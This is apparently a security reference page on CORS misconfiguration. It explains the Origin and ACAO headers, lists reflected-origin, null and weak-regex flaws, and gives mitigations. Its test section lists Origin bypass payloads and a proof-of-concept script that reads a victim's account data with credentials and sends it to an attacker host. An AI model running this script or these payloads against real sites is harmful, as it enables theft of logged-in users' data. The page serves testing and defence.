# What is CORS Misconfiguration?

Cross-Origin Resource Sharing (CORS) lets a server opt in to sharing responses with web pages from other origins. The same-origin policy normally blocks this. When CORS is configured too loosely, an attacker's site can make authenticated requests to the target and read the responses - stealing data from logged-in victims.

## How it works

The browser sends an `Origin` header; the server replies with `Access-Control-Allow-Origin` (ACAO). Problems appear when the server reflects or over-trusts that origin:

```http
# Request
GET /api/account HTTP/1.1
Origin: https://attacker.tld
Cookie: session=victim

# Dangerous response
Access-Control-Allow-Origin: https://attacker.tld
Access-Control-Allow-Credentials: true
```

That combination lets `attacker.tld` read the victim's account data.

## Misconfigurations to test

- **Reflected origin** - server copies any `Origin` into ACAO, plus `Allow-Credentials: true`
- **`Access-Control-Allow-Origin: *`** with credentials (browsers block this combo, but `*` on sensitive data is still a leak)
- **`null` origin trusted** - reachable from sandboxed iframes and some redirects
- **Weak regex** - `target.tld` match that also allows `target.tld.attacker.tld` or `nottarget.tld`
- **Trusting any subdomain** - one XSS on a subdomain then pivots everywhere

## Test payloads

```http
Origin: https://attacker.tld        # is it reflected?
Origin: null                        # is null trusted?
Origin: https://target.tld.attacker.tld   # prefix/suffix bypass
Origin: https://attackertarget.tld  # substring bypass
```

Proof-of-concept exfiltration page:

```html
<script>
fetch('https://target.tld/api/account', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.tld/log?d=' + encodeURIComponent(d)));
</script>
```

## Tools

- [Burp Suite](../../Tools/Burp%20Suite.md) - change `Origin` in Repeater and watch ACAO
- `CORScanner` for automated checks

## Mitigation

- Use a strict **allowlist** of trusted origins; never reflect arbitrary origins.
- Only send `Allow-Credentials: true` for origins you fully control.
- Do not trust `null`. Match origins exactly - no loose substring/regex checks.
- Keep sensitive data behind proper auth; CORS is not an access-control replacement.

## CWE

- CWE-942: Permissive Cross-domain Policy with Untrusted Domains

## Deep dive

- [PortSwigger CORS labs](https://portswigger.net/web-security/cors)
